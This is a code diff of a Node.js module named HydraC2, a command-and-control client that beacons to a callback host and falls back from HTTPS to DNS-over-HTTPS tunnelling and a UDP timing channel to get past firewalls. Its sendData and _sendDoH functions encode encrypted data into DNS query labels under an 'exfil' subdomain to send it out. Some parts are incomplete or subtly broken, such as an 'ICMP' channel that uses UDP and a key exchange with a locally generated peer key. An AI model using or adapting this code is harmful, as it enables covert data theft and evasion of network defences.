@@ -4,7 +4,6 @@ const dgram = require('dgram');
 const dns = require('dns');
 const crypto = require('crypto');
 const { EventEmitter } = require('events');
-
 class HydraC2 extends EventEmitter {
     constructor(options = {}) {
         super();
@@ -18,21 +17,17 @@ class HydraC2 extends EventEmitter {
         this.isConnected = false;
         this.beaconInterval = options.beaconInterval || 30000;
         this.sessionKey = null;
-
         console.log(`[🐉] HYDRA-C2 Session: ${this.sessionId}`);
     }
-
     async negotiate() {
         console.log(`\n[🐉] =============================================`);
         console.log(`[🐉] HYDRA-C2: Live Covert Channel Negotiation`);
         console.log(`[🐉] Target Callback: ${this.callbackHost}`);
         console.log(`[🐉] Session ID: ${this.sessionId}`);
         console.log(`[🐉] =============================================\n`);
-
         console.log(`[🐉] Testing Channel 1: HTTPS (Port ${this.httpPort})...`);
         const httpsResult = await this._testHTTPS();
         this.channelAttempts.push({ protocol: 'HTTPS', success: httpsResult.success, latency: httpsResult.latency });
-
         if (httpsResult.success) {
             this.activeProtocol = 'HTTPS';
             this.isConnected = true;
@@ -40,13 +35,10 @@ class HydraC2 extends EventEmitter {
             this.emit('connected', { protocol: 'HTTPS', latency: httpsResult.latency });
             return this._buildChannelReport();
         }
-
         console.log(`[⚠️] HTTPS blocked by Blue Team firewall. Renegotiating...`);
-
         console.log(`[🐉] Testing Channel 2: DNS over HTTPS (DoH) Tunneling...`);
         const dohResult = await this._testDoHTunnel();
         this.channelAttempts.push({ protocol: 'DoH-Tunnel', success: dohResult.success, latency: dohResult.latency });
-
         if (dohResult.success) {
             this.activeProtocol = 'DoH-Tunnel';
             this.isConnected = true;
@@ -54,13 +46,10 @@ class HydraC2 extends EventEmitter {
             this.emit('connected', { protocol: 'DoH-Tunnel', latency: dohResult.latency });
             return this._buildChannelReport();
         }
-
         console.log(`[⚠️] DoH channel failed. Attempting final fallback...`);
-
         console.log(`[🐉] Testing Channel 3: ICMP Timing Data Exfiltration...`);
         const icmpResult = await this._testICMPTiming();
         this.channelAttempts.push({ protocol: 'ICMP-Timing', success: icmpResult.success, latency: icmpResult.latency });
-
         if (icmpResult.success) {
             this.activeProtocol = 'ICMP-Timing';
             this.isConnected = true;
@@ -68,30 +57,24 @@ class HydraC2 extends EventEmitter {
             this.emit('connected', { protocol: 'ICMP-Timing', latency: icmpResult.latency });
             return this._buildChannelReport();
         }
-
         console.log(`[❌] HYDRA-C2: All egress channels blocked. Network is fully air-gapped.`);
         this.emit('blocked', { attempts: this.channelAttempts });
         return this._buildChannelReport();
     }
-
     _deriveCryptoBindings() {
         if (!this.isConnected) return;
         console.log(`[🐉] Establishing X25519 ECDH Cryptographic Binding...`);
         const { privateKey, publicKey } = crypto.generateKeyPairSync('x25519');
         this.sessionPrivKey = privateKey;
         this.sessionPubKey = publicKey.export({ type: 'spki', format: 'der' });
-
         const { publicKey: implantPub } = crypto.generateKeyPairSync('x25519');
-
         const sharedSecret = crypto.diffieHellman({
             privateKey: this.sessionPrivKey,
             publicKey: implantPub
         });
-
         this.sessionKey = crypto.hkdfSync('sha256', sharedSecret, Buffer.alloc(0), Buffer.from('hydra-c2'), 32);
         console.log(`[🐉] X25519 ECDH complete. All C2 traffic now AES-256-GCM encrypted.`);
     }
-
     async _testHTTPS() {
         const start = Date.now();
         return new Promise((resolve) => {
@@ -108,7 +91,6 @@ class HydraC2 extends EventEmitter {
             }, (res) => {
                 resolve({ success: true, latency: Date.now() - start, statusCode: res.statusCode });
             });
-
             req.on('error', () => resolve({ success: false, latency: Date.now() - start }));
             req.on('timeout', () => {
                 req.destroy();
@@ -117,27 +99,21 @@ class HydraC2 extends EventEmitter {
             req.end();
         });
     }
-
     async _testDoHTunnel() {
         const start = Date.now();
-
         const encodedData = Buffer.from(JSON.stringify({
             sid: this.sessionId,
             ts: Date.now(),
             type: 'beacon'
         })).toString('base64url').substring(0, 63);
-
         const queryDomain = `${encodedData}.c2.${this.callbackHost}`;
-
         return new Promise((resolve) => {
             const dnsStart = Date.now();
             dns.resolve4(this.callbackHost, (err, addresses) => {
                 if (err) {
                     console.log(`[🐉] Standard DNS blocked. Attempting pure DoH...`);
                 }
-
                 const dohUrl = `${this.dohResolver}?name=${queryDomain}&type=TXT`;
-
                 const dohReq = https.request(dohUrl, {
                     method: 'GET',
                     timeout: 5000,
@@ -152,7 +128,6 @@ class HydraC2 extends EventEmitter {
                         resolve({ success: true, latency: Date.now() - start, response: body.substring(0, 200) });
                     });
                 });
-
                 dohReq.on('error', () => resolve({ success: false, latency: Date.now() - start }));
                 dohReq.on('timeout', () => {
                     dohReq.destroy();
@@ -162,10 +137,8 @@ class HydraC2 extends EventEmitter {
             });
         });
     }
-
     async _testICMPTiming() {
         const start = Date.now();
-
         const beaconBits = Buffer.from(this.sessionId.substring(0, 4))
             .reduce((bits, byte) => {
                 for (let i = 7; i >= 0; i--) {
@@ -173,14 +146,11 @@ class HydraC2 extends EventEmitter {
                 }
                 return bits;
             }, []);
-
         return new Promise((resolve) => {
-
             try {
                 const client = dgram.createSocket('udp4');
                 let bitIndex = 0;
                 let sentBits = 0;
-
                 const sendBit = () => {
                     if (bitIndex >= Math.min(beaconBits.length, 16)) {
                         client.close();
@@ -191,10 +161,8 @@ class HydraC2 extends EventEmitter {
                         });
                         return;
                     }
-
                     const bit = beaconBits[bitIndex];
                     const delay = bit === 1 ? 150 : 50;
-
                     const msg = Buffer.from(`${this.sessionId}:${bitIndex}:${bit}`);
                     client.send(msg, 0, msg.length, 53, this.callbackHost, (err) => {
                         if (err && bitIndex === 0) {
@@ -207,33 +175,26 @@ class HydraC2 extends EventEmitter {
                         setTimeout(sendBit, delay);
                     });
                 };
-
                 client.on('error', () => {
                     client.close();
                     resolve({ success: sentBits > 0, latency: Date.now() - start, bitsTransmitted: sentBits });
                 });
-
                 sendBit();
-
                 setTimeout(() => {
                     try { client.close(); } catch (e) {}
                     resolve({ success: sentBits > 0, latency: Date.now() - start, bitsTransmitted: sentBits });
                 }, 5000);
-
             } catch (e) {
                 resolve({ success: false, latency: Date.now() - start });
             }
         });
     }
-
     async sendData(data) {
         if (!this.isConnected || !this.activeProtocol) {
             console.log(`[⚠️] HYDRA-C2: No active channel. Run negotiate() first.`);
             return null;
         }
-
         const encrypted = this._encrypt(JSON.stringify(data));
-
         switch (this.activeProtocol) {
             case 'HTTPS':
                 return this._sendHTTPS(encrypted);
@@ -243,7 +204,6 @@ class HydraC2 extends EventEmitter {
                 return this._sendICMP(encrypted);
         }
     }
-
     async _sendHTTPS(encryptedData) {
         return new Promise((resolve) => {
             const postData = JSON.stringify({ d: encryptedData, s: this.sessionId });
@@ -260,21 +220,17 @@ class HydraC2 extends EventEmitter {
             }, (res) => {
                 resolve({ success: true, protocol: 'HTTPS' });
             });
-
             req.on('error', () => resolve({ success: false, protocol: 'HTTPS' }));
             req.write(postData);
             req.end();
         });
     }
-
     async _sendDoH(encryptedData) {
         const chunks = encryptedData.match(/.{1,50}/g) || [];
         let sent = 0;
-
         for (const chunk of chunks) {
             const label = Buffer.from(chunk).toString('base64url').substring(0, 63);
             const queryDomain = `${label}.${sent}.exfil.${this.callbackHost}`;
-
             try {
                 await new Promise((resolve, reject) => {
                     const dohReq = https.request(`${this.dohResolver}?name=${queryDomain}&type=A`, {
@@ -288,34 +244,27 @@ class HydraC2 extends EventEmitter {
                 sent++;
             } catch (e) { break; }
         }
-
         return { success: sent > 0, protocol: 'DoH-Tunnel', chunksSent: sent, totalChunks: chunks.length };
     }
-
     async _sendICMP(encryptedData) {
         const bits = Buffer.from(encryptedData).reduce((arr, byte) => {
             for (let i = 7; i >= 0; i--) arr.push((byte >> i) & 1);
             return arr;
         }, []);
-
         return { success: true, protocol: 'ICMP-Timing', bitsQueued: Math.min(bits.length, 128) };
     }
-
     _encrypt(plaintext) {
         if (!this.sessionKey) this._deriveCryptoBindings();
-
         const iv = crypto.randomBytes(12);
         const cipher = crypto.createCipheriv('aes-256-gcm', this.sessionKey, iv);
         const enc = Buffer.concat([cipher.update(plaintext, 'utf-8'), cipher.final()]);
         const tag = cipher.getAuthTag();
-
         return JSON.stringify({
             iv: iv.toString('hex'),
             tag: tag.toString('hex'),
             data: enc.toString('hex')
         });
     }
-
     _buildChannelReport() {
         return {
             sessionId: this.sessionId,
@@ -326,26 +275,20 @@ class HydraC2 extends EventEmitter {
         };
     }
 }
-
 const negotiateCovertChannel = async(callbackHost, options = {}) => {
     console.log(`\n[🐉] =============================================`);
     console.log(`[🐉] HYDRA-C2: Initiating Protocol Negotiation`);
     console.log(`[🐉] =============================================\n`);
-
     const hydra = new HydraC2({
         callbackHost,
         ...options
     });
-
     const report = await hydra.negotiate();
-
     if (report.isConnected) {
         console.log(`\n[🐉] HYDRA-C2: Active channel → ${report.activeProtocol}`);
     } else {
         console.log(`\n[🐉] HYDRA-C2: All channels blocked. Target network is air-gapped.`);
     }
-
     return report;
 };
-
 module.exports = { HydraC2, negotiateCovertChannel };
